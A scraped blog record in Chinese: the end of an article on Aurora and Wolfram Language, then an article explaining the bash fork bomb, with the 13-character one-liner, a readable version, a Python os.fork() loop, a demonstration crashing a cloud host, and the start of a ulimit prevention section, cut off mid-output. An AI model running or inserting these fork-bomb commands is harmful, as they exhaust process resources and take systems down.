</p>\n<h3><strong>符号式编程（Symbolic programming）</strong></h3>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/05/dc5631032a4b6e0925aa2289c5f6ff4e.png\" alt=\"\" width=\"303\" height=\"235\"></p>\n<p>示例语言：<a href=\"https://www.youtube.com/watch?v=L6iUm_Cqx2s\" target=\"_blank\" rel=\"nofollow\">Aurora</a></p>\n<p><a href=\"https://www.youtube.com/watch?v=L6iUm_Cqx2s\" target=\"_blank\" rel=\"nofollow\">Aurora</a> 语言是<a href=\"http://en.wikipedia.org/wiki/Symbolic_programming\" target=\"_blank\" rel=\"nofollow\">符号式编程</a>的一个例子：使用这些语言编写的“代码”不仅可以包含纯文本，还可以包括图像、数学方程、图和图表等。你可以以该数据的原生格式来操作和描述各种大量的数据，而不是全部以文本形式描述。Aurora 也是完全可交互的，它会立即显示每行代码的结果，像 steroids 中的 REPL。</p>\n<p>Aurora 语言由 <a href=\"http://www.chris-granger.com/\" target=\"_blank\" rel=\"nofollow\">Chris Granger</a> 创建，它还构建了 <a href=\"http://www.lighttable.com/\" target=\"_blank\" rel=\"nofollow\">Light Table IDE</a>。Chris 在它的文章 <a href=\"http://www.chris-granger.com/2014/03/27/toward-a-better-programming/\" target=\"_blank\" rel=\"nofollow\">Toward a better programming</a>（为了更好地编程）中概述了创建 Aurora 的动机：一些目标是使编程更直观、直接和减少偶然的复杂性。要了解更多的信息，观看 <a href=\"http://worrydream.com/\" target=\"_blank\" rel=\"nofollow\">Bret Victor 的</a>演讲：<a href=\"http://vimeo.com/36579366\" target=\"_blank\" rel=\"nofollow\">Inventing on Principle</a>, <a href=\"http://vimeo.com/67076984\" target=\"_blank\" rel=\"nofollow\">Media for Thinking the Unthinkable</a>, 和 <a href=\"http://worrydream.com/#!/LearnableProgramming\" target=\"_blank\" rel=\"nofollow\">Learnable Programming</a>。</p>\n<p><em>更新：“符号式编程”可能不太适合用于描述 Aurora。有关更多信息，请参阅 <a href=\"http://en.wikipedia.org/wiki/Symbolic_programming\" target=\"_blank\" rel=\"nofollow\">Symbolic programming</a> 的维基主页。</em></p>\n<p> </p>\n<h3><strong>基于知识的编程（Knowledge-based programming）</strong></h3>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/05/53fe167d21d19ac5536159d2a6ef234f.png\" alt=\"\" width=\"500\" height=\"136\"></p>\n<p>示例：<a href=\"https://www.wolfram.com/language/\" target=\"_blank\" rel=\"nofollow\">Wolfram Language</a></p>\n<p>很像上面提到的 Aurora 语言，<a href=\"https://www.wolfram.com/language/\" target=\"_blank\" rel=\"nofollow\">Wolfram 语言</a>也是基于符号的编程。然而，符号层仅仅是为 Wolfram 语言的核心提供一致的接口，Wolfram 语言是基于知识的编程语言：内置了大量的库、算法和数据。这使得可以轻松地从图形化的 Facebook 连接，到操纵图像、查找天气、处理自然语言查询、绘制地图上的方向、求解数学方式等方面做好一切。</p>\n<p>我猜想 Wolfram 语言有最大的“标准库”和任何现有语言的数据集。对于 Internet connectivity 是编写代码的固有功能，我也感到十分兴奋：它几乎像一个 IDE，其中的自动完成功能进行谷歌搜索。看符号式编程模型是否像 Wolfram 所说的那样灵活并真正利用所有这些数据，这将是非常有趣的。</p>\n<p><em>更新：尽管 Wolfram 声称 Wolfram 语言支持“符号式编程”和“知识编程”，但这些术语的定义有所不同，有关更详细的信息请参阅 <a href=\"http://en.wikipedia.org/wiki/Knowledge_level\" rel=\"nofollow\">Knowledge level</a> 和 <a href=\"http://en.wikipedia.org/wiki/Symbolic_programming\" rel=\"nofollow\">Symbolic Programming</a> 的维基主页。</em></p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"111165\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"111165votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"111165\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 3 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2017/05/893809b18796c9cecaac388d73d8fc08.jpg"], "fav_nums": 3, "comment_nums": 0, "create_date": "2017/05/13", "praise_nums": 1}
{"tags": " 1 评论 ,开发,shell,Linux", "front_image_path": "full/3726f76f7860bfbbfe44183c3f2bc77547eebfe0.jpg", "title": "经典的 Fork 炸弹解析", "url_object_id": "09f079d897acf3470c973cad36deb549", "url": "http://blog.jobbole.com/111319/", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"http://blog.saymagic.cn/2015/03/25/fork-bomb.html\">saymagic</a>   </div><p><img id=\"pic\" class=\"\" src=\"http://wx1.sinaimg.cn/large/7cc829d3gy1fg4b78x2izj20go083gog.jpg\"></p>\n<p>Jaromil 在 2002 年设计了最为精简的一个Linux Fork炸弹，整个代码只有13个字符，在 shell 中运行后几秒后系统就会宕机：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd5749450b851667320\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n:(){:|:&amp;};:</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd5749450b851667320-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd5749450b851667320-1\"><span class=\"crayon-o\">:</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">{</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">|</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-sy\">}</span><span class=\"crayon-sy\">;</span><span class=\"crayon-o\">:</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>这样看起来不是很好理解，我们可以更改下格式：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd57494514529489739\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n:()\r\n{\r\n\t:|:&amp;\r\n};\r\n:</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd57494514529489739-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd57494514529489739-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bd57494514529489739-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd57494514529489739-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594bd57494514529489739-5\">5</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd57494514529489739-1\"><span class=\"crayon-o\">:</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd57494514529489739-2\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-594bd57494514529489739-3\"><span class=\"crayon-h\">\t</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">|</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">&amp;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd57494514529489739-4\"><span class=\"crayon-sy\">}</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-594bd57494514529489739-5\"><span class=\"crayon-o\">:</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>更好理解一点的话就是这样:</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd57494518867738709\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nbomb()\r\n{\r\n\tbomb|bomb&amp;\r\n};\r\nbomb</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd57494518867738709-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd57494518867738709-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bd57494518867738709-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd57494518867738709-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594bd57494518867738709-5\">5</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd57494518867738709-1\"><span class=\"crayon-e\">bomb</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd57494518867738709-2\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-594bd57494518867738709-3\"><span class=\"crayon-h\">\t</span><span class=\"crayon-v\">bomb</span><span class=\"crayon-o\">|</span><span class=\"crayon-v\">bomb</span><span class=\"crayon-o\">&amp;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd57494518867738709-4\"><span class=\"crayon-sy\">}</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-594bd57494518867738709-5\"><span class=\"crayon-v\">bomb</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>因为shell中函数可以省略<code>function</code>关键字，所以上面的十三个字符是功能是定义一个函数与调用这个函数，函数的名称为<code>:</code>，主要的核心代码是<code>:|:&amp;</code>，可以看出这是一个函数本身的递归调用，通过<code>&amp;</code>实现在后台开启新进程运行，通过管道实现进程呈几何形式增长，最后再通过<code>:</code>来调用函数引爆炸弹。因此，几秒钟系统就会因为处理不过来太多的进程而死机，解决的唯一办法就是重启。</p>\n<h3 id=\"lyuhf\">Bomb一下</h3>\n<p>秉着不作不死的心态，我们也来运行一下，于是我将矛头指向云主机，，我使用了国内的一个2G内存的云主机，首先在本地开启两个终端，在一个终端连接云主机后运行炸弹，秒后再尝试用另外一个终端登录，效果可以看下面Gif图：</p>\n<p><img id=\"pic\" class=\"\" src=\"http://wx1.sinaimg.cn/large/7cc829d3gy1fg4b78apa1g20of0cc149.gif\"></p>\n<p>看，运行一段时间后直接报出了<code>-bash: fork: Cannot allocate memory</code>，说明内存不足了。并且我在二号终端上尝试连接也没有任何反应。因为是虚拟的云主机，所以我只能通过主机服务商的后台来给主机断电重启。然后才能重新登录：</p>\n<p><img id=\"pic\" class=\"\" src=\"http://wx1.sinaimg.cn/large/7cc829d3gy1fg4b928t0sg20of0ccdk5.gif\"></p>\n<h3 id=\"gtjjj\">炸弹危害</h3>\n<p>Fork炸弹带来的后果就是耗尽服务器资源，使服务器不能正常的对外提供服务，也就是常说的DoS(Denial of Service)。与传统1v1、通过不断向服务器发送请求造成服务器崩溃不同，Fork炸弹有种坐山观虎斗，不费一兵一卒斩敌人于马下的感觉。更吓人的是这个函数是不需要root权限就可以运行的。看到网上有帖子说某些人将个性签名改为Fork炸弹，结果果真有好奇之人中枪，试想如果中枪的人是在公司服务器上运行的话，oh，！</p>\n<h3 id=\"wutmu\">预防方式</h3>\n<p>当然，Fork炸弹没有那么可怕，用其它语言也可以分分钟写出来一个，例如，python版：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd5749451c737680323\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nimport os\r\n \twhile True: \r\n \tos.fork()</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd5749451c737680323-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd5749451c737680323-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bd5749451c737680323-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd5749451c737680323-1\"><span class=\"crayon-e\">import </span><span class=\"crayon-e\">os</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd5749451c737680323-2\"><span class=\"crayon-e\"> \t</span><span class=\"crayon-st\">while</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">True</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span></div><div class=\"crayon-line\" id=\"crayon-594bd5749451c737680323-3\"><span class=\"crayon-h\"> \t</span><span class=\"crayon-v\">os</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">fork</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>Fork炸弹的本质无非就是靠创建进程来抢占系统资源，在Linux中，我们可以通过<code>ulimit</code>命令来限制用户的某些行为，运行<code>ulimit -a</code>可以查看我们能做哪些限制：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd57494520616431657\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nubuntu@10-10-57-151:~$ ulimit -a\r\ncore file size          (blocks, -c) 0\r\ndata seg size           (kbytes, -d) unlimited\r\nscheduling priority             (-e) 0\r\nfile size               (blocks, -f) unlimited\r\npending signals                 (-i) 7782\r\nmax locked memory       (kbytes, -l) 64\r\nmax memory size         (kbytes, -m) unlimited\r\nopen files                      (-n) 1024\r\npipe size            (512 bytes, -p) 8\r\nPOSIX message queues     (bytes, -q) 819200\r\nreal-time priority              (-r) 0\r\nstack size              (kbytes, -s) 8192\r\ncpu time               (seconds, -t) unlimited\r\nmax user processes              (-u) 7782\r\nvirtual memory          (kbytes, -v) unlimited\r\nfile locks                      (-x) unlimited</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd57494520616431657-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd57494520616431657-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bd57494520616431657-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd57494520616431657-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594bd57494520616431657-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd57494520616431657-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-594bd57494520616431657-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd57494520616431657-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-594bd57494520616431657-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd57494520616431657-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-594bd57494520616431657-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd57494520616431657-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-594bd57494520616431657-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd57494520616431657-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-594bd57494520616431657-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd57494520616431657-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-594bd57494520616431657-17\">17</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd57494520616431657-1\"><span class=\"crayon-v\">ubuntu</span><span class=\"crayon-sy\">@</span><span class=\"crayon-cn\">10</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">10</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">57</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">151</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">~</span><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ulimit</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">a</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd57494520616431657-2\"><span class=\"crayon-e\">core </span><span class=\"crayon-e\">file </span><span class=\"crayon-e\">size</span><span class=\"crayon-h\">          </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">blocks</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">c</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span></div><div class=\"crayon-line\" id=\"crayon-594bd57494520616431657-3\"><span class=\"crayon-e\">data </span><span class=\"crayon-e\">seg </span><span class=\"crayon-e\">size</span><span class=\"crayon-h\">           </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">kbytes</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">d</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">unlimited</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd57494520616431657-4\"><span class=\"crayon-e\">scheduling </span><span class=\"crayon-e\">priority</span><span class=\"crayon-h\">             </span><span class=\"crayon-sy\">(</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">e</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span></div><div class=\"crayon-line\" id=\"crayon-594bd57494520616431657-5\"><span class=\"crayon-e\">file </span><span class=\"crayon-e\">size</span><span class=\"crayon-h\">               </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">blocks</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">f</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">unlimited</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd57494520616431657-6\"><span class=\"crayon-e\">pending </span><span class=\"crayon-e\">signals</span><span class=\"crayon-h\">                 </span><span class=\"crayon-sy\">(</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">7782</span></div><div class=\"crayon-line\" id=\"crayon-594bd57494520616431657-7\"><span class=\"crayon-e\">max </span><span class=\"crayon-e\">locked </span><span class=\"crayon-e\">memory</span><span class=\"crayon-h\">       </span><span 